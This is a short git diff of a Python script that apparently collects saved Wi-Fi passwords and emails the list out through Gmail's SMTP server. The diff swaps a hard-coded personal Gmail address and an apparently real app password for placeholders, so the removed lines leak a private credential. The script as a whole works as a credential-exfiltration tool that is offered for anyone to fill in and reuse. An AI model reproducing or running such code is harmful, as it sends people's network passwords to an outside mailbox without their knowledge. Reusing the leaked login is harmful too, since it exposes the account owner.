@@ -48,14 +48,14 @@ for item in wifi_list:
 
 # Create EmailMessage Object
 msg = EmailMessage()
-recipients=["bhartiabhishek310@gmail.com"]
-msg['From'] = "Abhishek Bharti"
+recipients=["your email id "]
+msg['From'] = "your name"
 msg['To'] =  ", ".join(recipients)
 msg['Subject'] = 'List of wifi password'
 msg.set_content(email_message)
 # Send the message via our own SMTP server.
-login_id ="bhartiabhishek310@gmail.com"
-login_pass ="txbcpxomnqqiiwdl"                  #app key different for every person
+login_id ="Your email id"
+login_pass ="your app password"                  #app key different for every person
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(login_id,login_pass)
 # print("login successfully")
